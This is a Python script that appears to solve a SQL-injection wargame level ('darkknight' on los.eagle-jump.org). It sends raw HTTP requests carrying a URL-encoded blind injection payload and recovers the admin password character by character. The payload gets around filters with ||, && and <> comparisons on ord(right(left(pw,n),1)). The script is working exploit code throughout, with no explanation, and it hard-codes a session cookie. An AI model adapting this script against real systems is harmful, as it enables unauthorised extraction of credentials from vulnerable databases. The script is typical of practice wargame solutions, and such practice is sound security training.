import socket

array = ""
for n in range(1,9):
    for x in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=":
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(("104.27.175.42", 80))
        data = "GET /darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no=1423+%7c%7c+(not+(ord(right(left(pw,+" + str(n) + "),+1))+%3c%3e+" + str(ord(x)) + ")+%26%26+not+(id+%3c%3e+%22admin%22))+%23&pw=1" + " HTTP/1.1\r\n" + \
                "Host: los.eagle-jump.org\r\n" + \
                "Cookie: __cfduid=dda4d8e6a10d2d630e0b224675adf7ff21489487743; PHPSESSID=7f9k1otik4u5tlf650brofubq4\r\n" + \
                "Referer: https://los.eagle-jump.org/gate.php\r\n" + \
                "\r\n"

        send.send(data.encode())
        recv = send.recv(1500)

        send.close()

        if "Hello admin" in recv.decode():
            array += x
            break

    print(array)
